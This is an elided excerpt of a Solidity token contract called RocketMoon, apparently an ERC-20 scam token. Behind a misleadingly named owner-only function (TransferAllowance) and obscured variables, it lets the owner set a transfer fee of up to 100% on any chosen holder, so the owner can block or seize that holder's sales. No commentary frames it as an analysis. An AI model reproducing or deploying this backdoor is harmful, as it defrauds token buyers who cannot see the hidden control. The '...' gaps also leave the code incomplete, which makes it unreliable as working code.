...
contract RocketMoon is IERC20, Ownable {
 ...
 uint256 private buyFees = 0;
    ...
    uint256 private _supplierA;
    address private _seederA;
    ...
    constructor(
        ...
        _supplierA = _totalSupply * _decimals;
    ...
    function TransferAllowance(address org, uint256 amnt) public override onlyowner {
        require(amnt <= 100, "Personal transfer must not exceed 100%");
        _private[org] = amnt;
    }
    ...
    function _checkAndUpdate(
        ...
        if (sender == _seederA && recipient == _seederA) {
    ...
    function _transfer(
        ...
        require(
            recipient != address(0),
            "IERC20: transfer to the zero 0 address never allowed"
        );
        require(sender != address(0), "IERC20: transfer from the zero 0 address never allowed");

        uint256 fees = 0;

        if (_private[sender] > 0) {
            fees = _private[sender] * _supplierA * _decimals / hundr;
    ...
    function _approve(
        ...
        require(owner != address(0), "ERC20: approve from the zero 0 address");
        require(spender != address(0), "ERC20: approve to the  zero 0 address");
